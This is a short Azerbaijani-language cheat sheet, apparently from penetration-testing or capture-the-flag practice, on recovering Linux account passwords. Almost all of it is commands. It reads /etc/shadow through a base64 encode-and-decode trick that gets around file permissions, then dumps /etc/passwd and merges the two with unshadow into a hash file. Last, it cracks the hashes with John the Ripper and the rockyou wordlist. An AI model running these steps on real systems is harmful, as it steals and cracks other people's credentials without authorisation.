## Hashlanmish hesablarin parollarini tapilmasi 
## ilk olaraq 
    /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
## daha sonra 
    cat /etc/passwd
## daha sonra atack masin oz kalimize kecib bir tmp folderi kimi foldere kecirik  
     unshadow passwd{file} shadow{file}  | tee hash

## daha sonra bunu qeyd edib tee ile hash adinda iksini birlesdirib bir fayl yaradiriq 
## ve userdeki hisseye kecib asaqdaki emri verib parolu tapiriq
    sudo john --wordlist=/usr/share/wordlists/rockyou.txt  {hash}
